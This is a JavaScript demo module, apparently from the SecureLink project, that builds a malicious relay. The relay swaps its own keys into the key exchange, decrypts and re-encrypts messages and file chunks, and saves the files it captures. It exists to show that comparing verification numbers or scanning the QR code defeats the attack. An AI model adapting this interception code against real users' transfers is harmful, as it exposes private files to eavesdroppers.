// DEMO ONLY: a malicious SecureLink relay that tries a man-in-the-middle attack.
//
// It swaps its own keys into the key exchange, then decrypts and re-encrypts
// everything that passes through. What the demo shows:
//   * The two devices display DIFFERENT verification numbers. If people
//     compare them and tap "They don't match", the attack fails.
//   * If the receiver joined by scanning the QR code, the attack fails
//     automatically: the relay cannot prove it scanned the code.
//   * If people tap "Numbers match" without looking, the relay can read the
//     files. They are saved in mitm-captured/ to make that visible.
//
// Run:  npm run demo:mitm   (then use https://<this computer>:3443 as usual)
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  generateKeyPair, deriveSessionKeys, computeSas, b64u, unb64u, concat, u32, chunkAad,
  cleanFileName, FRAME_HEADER_BYTES,
} from "../src/protocol.mjs";

const te = new TextEncoder();
const td = new TextDecoder();
const subtle = globalThis.crypto.subtle;
const CTL_AAD = te.encode("SL2|ctl");

async function sha256(b) { return new Uint8Array(await subtle.digest("SHA-256", b)); }

/** Builds the interceptor used by createSecureLinkServer({ interceptor }). */
export function createMitmInterceptor({ log = console.log, captureDir = null, onCapture = null, onSas = null } = {}) {
  const st = (room) => (room.mitm ||= { files: new Map() });

  async function reEncryptCtl(body, fromKey, toKey) {
    const pt = new Uint8Array(await subtle.decrypt({ name: "AES-GCM", iv: unb64u(body.iv), additionalData: CTL_AAD }, fromKey, unb64u(body.ct)));
    const iv = globalThis.crypto.getRandomValues(new Uint8Array(12));
    const ct = new Uint8Array(await subtle.encrypt({ name: "AES-GCM", iv, additionalData: CTL_AAD }, toKey, pt));
    return { inner: JSON.parse(td.decode(pt)), body: { t: "enc", iv: b64u(iv), ct: b64u(ct) } };
  }

  return {
    async relay({ room, from, body, send }) {
      const m = st(room);
      if (from === "sender" && body.t === "commit") {
        // Pretend to be the receiver towards A and the sender towards B.
        m.toA = await generateKeyPair();
        m.toB = await generateKeyPair();
        return send({ ...body, h: b64u(await sha256(m.toB.pub)) });
      }
      if (from === "receiver" && body.t === "pk") {
        m.pkB = unb64u(body.pk);
        return send({ ...body, pk: b64u(m.toA.pub) });
      }
      if (from === "sender" && body.t === "reveal") {
        m.pkA = unb64u(body.pk);
        m.keysA = await deriveSessionKeys(m.toA.privateKey, m.pkA, m.pkA, m.toA.pub); // A <-> relay
        m.keysB = await deriveSessionKeys(m.toB.privateKey, m.pkB, m.toB.pub, m.pkB); // relay <-> B
        const sasA = await computeSas(m.pkA, m.toA.pub);
        const sasB = await computeSas(m.toB.pub, m.pkB);
        log(`[MITM] keys swapped. Sender will see ${sasA}, receiver will see ${sasB}.`);
        if (onSas) onSas({ sender: sasA, receiver: sasB });
        return send({ ...body, pk: b64u(m.toB.pub) });
      }
      if (body.t === "enc" && m.keysA && m.keysB) {
        const fromSender = from === "sender";
        const out = fromSender
          ? await reEncryptCtl(body, m.keysA.ab, m.keysB.ab)
          : await reEncryptCtl(body, m.keysB.ba, m.keysA.ba);
        if (fromSender && out.inner.k === "meta") {
          m.files.set(out.inner.id, { meta: out.inner, prefix: unb64u(out.inner.np), parts: [] });
          log(`[MITM] reading file name: ${out.inner.name} (${out.inner.size} bytes)`);
        }
        return send(out.body);
      }
      if (body.t === "qrmac") log("[MITM] the receiver used the QR code. The relay cannot forge its proof, so the attack will be detected.");
      return send(body); // commit/pk from the wrong side, qrmac, ack, cancel: unchanged
    },

    async binary({ room, from, data, send }) {
      const m = st(room);
      if (from !== "sender" || !m.keysA) return send(data);
      const frame = new Uint8Array(data);
      const id = b64u(frame.subarray(1, 17));
      const index = new DataView(frame.buffer, frame.byteOffset + 17, 4).getUint32(0);
      const f = m.files.get(id);
      if (!f) return send(data);
      const params = { name: "AES-GCM", iv: concat(f.prefix, u32(index)), additionalData: chunkAad(id, index, f.meta.chunks) };
      const plain = new Uint8Array(await subtle.decrypt(params, m.keysA.ab, frame.subarray(FRAME_HEADER_BYTES)));
      f.parts.push(plain);
      const ct = new Uint8Array(await subtle.encrypt(params, m.keysB.ab, plain));
      send(Buffer.from(concat(frame.subarray(0, FRAME_HEADER_BYTES), ct)));
      if (index + 1 === f.meta.chunks) {
        const bytes = concat(...f.parts);
        log(`[MITM] captured the whole file: ${f.meta.name} (${bytes.length} bytes)`);
        if (onCapture) onCapture({ name: f.meta.name, bytes });
        if (captureDir) {
          fs.mkdirSync(captureDir, { recursive: true });
          fs.writeFileSync(path.join(captureDir, `${Date.now()}-${cleanFileName(f.meta.name)}`), bytes);
        }
        m.files.delete(id);
      }
    },
  };
}

// ----- run as a program -----
if (process.argv[1] && fileURLToPath(import.meta.url) === path.resolve(process.argv[1])) {
  const { createRequire } = await import("node:module");
  const require = createRequire(import.meta.url);
  const { createSecureLinkServer, lanAddresses } = require("../server/app.js");
  const { loadOrCreateCert } = require("../server/cert.js");
  const port = Number(process.env.HTTPS_PORT) || 3443;
  const ips = lanAddresses();
  const c = loadOrCreateCert(ips);
  const captureDir = path.join(path.dirname(fileURLToPath(import.meta.url)), "..", "mitm-captured");
  const sl = createSecureLinkServer({ tls: { key: c.key, cert: c.cert }, interceptor: createMitmInterceptor({ captureDir }) });
  sl.server.listen(port, () => {
    console.log("\n*** DEMO: MALICIOUS RELAY (man in the middle) ***");
    console.log(`  https://localhost:${port}`);
    for (const ip of ips) console.log(`  https://${ip}:${port}`);
    console.log("  Compare the verification numbers on both devices: they will differ.");
    console.log(`  Files are captured only if both people tap "Numbers match" anyway (saved in mitm-captured/).\n`);
  });
}
